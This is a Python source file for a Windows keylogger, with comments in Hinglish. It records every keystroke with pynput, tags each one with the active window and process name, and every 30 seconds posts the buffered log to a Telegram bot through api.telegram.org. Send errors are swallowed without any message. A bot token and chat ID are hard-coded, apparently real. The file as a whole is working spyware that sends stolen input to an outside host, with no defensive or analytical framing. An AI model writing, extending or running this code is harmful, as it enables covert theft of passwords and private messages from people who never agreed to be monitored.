import time
import threading
import requests
import os
from datetime import datetime
from pynput import keyboard
import win32gui  # Active window ke liye
import win32process
import psutil  # Optional for process name, but pywin32 sufficient

# ============= CONFIG =============
TELEGRAM_BOT_TOKEN = "8303464927:AAGq6lwHcTsYYOAbDUFkH9YTfHUzFAaq2dU"  # Yahan daal
TELEGRAM_CHAT_ID = "-1004320842899"      # Integer as string ya int
SEND_INTERVAL = 30  # seconds mein buffer send karne ka interval
# =================================

log_buffer = ""
last_window = ""
running = True

def get_active_window_title():
    try:
        hwnd = win32gui.GetForegroundWindow()
        if hwnd:
            title = win32gui.GetWindowText(hwnd)
            # Process name bhi try
            try:
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                proc = psutil.Process(pid)
                app = proc.name()
                return f"{app} - {title}"
            except:
                return title
    except:
        pass
    return "Unknown"

def send_to_telegram(message):
    if not message.strip():
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, data=data, timeout=10)
    except:
        pass  # Silent fail for smoothness

def flush_buffer():
    global log_buffer
    while running:
        time.sleep(SEND_INTERVAL)
        if log_buffer.strip():
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            header = f"🕒 <b>{timestamp}</b>\n📱 <b>Window:</b> {last_window or 'N/A'}\n\n"
            send_to_telegram(header + log_buffer)
            log_buffer = ""

def on_press(key):
    global log_buffer, last_window
    try:
        current_window = get_active_window_title()
        if current_window != last_window:
            last_window = current_window
            # Window change log
            log_buffer += f"\n[Window Changed: {current_window}]\n"
        
        if hasattr(key, 'char') and key.char is not None:
            log_buffer += key.char
        else:
            key_name = str(key).replace("Key.", "")
            if key_name == "space":
                log_buffer += " "
            elif key_name == "enter":
                log_buffer += " [ENTER]\n"
            elif key_name == "backspace":
                log_buffer += " [BACKSPACE]"
            elif key_name in ["ctrl_l", "ctrl_r", "alt_l", "alt_r", "shift", "tab"]:
                log_buffer += f" [{key_name.upper()}]"
            else:
                log_buffer += f" [{key_name}]"
    except:
        log_buffer += " [UNKNOWN]"

def on_release(key):
    if key == keyboard.Key.esc:  # Esc press karke stop (testing ke liye)
        global running
        running = False
        return False

def main():
    print("Keylogger starting... (Esc to stop for testing)")
    
    # Background thread for periodic send
    sender_thread = threading.Thread(target=flush_buffer, daemon=True)
    sender_thread.start()
    
    # Keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Stopped.")
